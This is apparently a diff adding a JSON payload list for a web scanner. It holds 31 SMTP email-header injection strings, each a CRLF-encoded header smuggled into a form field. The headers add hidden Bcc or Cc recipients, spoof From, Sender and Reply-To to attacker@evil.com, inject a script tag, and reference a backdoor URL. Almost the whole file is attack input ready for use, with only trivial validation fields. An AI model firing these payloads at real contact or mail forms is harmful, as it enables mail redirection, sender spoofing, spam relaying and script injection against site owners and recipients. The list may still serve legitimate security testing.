@@ -1,0 +1,332 @@
+[
+  {
+    "payload_id": "OWP-0755",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aCc: victim@target.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0756",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aBcc: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0757",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0758",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aReply-To: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0759",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aX-Mailer: Hacked",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0760",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aContent-Disposition: attachment; filename=\"malicious.pdf\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0761",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aSubject: =?UTF-8?B?RW1haWwgSGVhZGVyIEluamVjdGlvbg==?=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0762",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0aContent-Type: multipart/mixed%0aBoundary=--BOUNDARY",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0763",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aMIME-Version: 1.0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0764",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aTo: thousands@example.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0765",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aList-Unsubscribe: <http://evil.com/track>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0766",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aReturn-Path: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1321",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aX-Originating-IP: [127.0.0.1]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1322",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aX-Priority: 1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1323",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aOrganization: EvilCorp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1324",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aContent-Transfer-Encoding: base64",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1325",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aContent-ID: <evil@payload.com>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1326",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aMessage-ID: <fake@domain.com>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1327",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aIn-Reply-To: <legit@target.com>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1328",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aReferences: <legit@target.com>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1329",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aDKIM-Signature: v=1; a=rsa-sha256; d=evil.com;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1330",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aContent-Description: malic",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1331",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aFrom: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1332",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aSender: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1333",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aErrors-To: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1334",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aDisposition-Notification-To: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1335",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aX-Confirm-Reading-To: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1336",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aReturn-Receipt-To: attacker@evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1337",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aX-PHP-Script: evil.com/backdoor.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1338",
+    "vulnerability_category": "Injection (SMTP)",
+    "target_technology": "Mail Server",
+    "injection_point": "form_parameter",
+    "payload_string": "test@test.com%0d%0aX-Mailer: PHP/%0d%0aX-Spam: yes",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
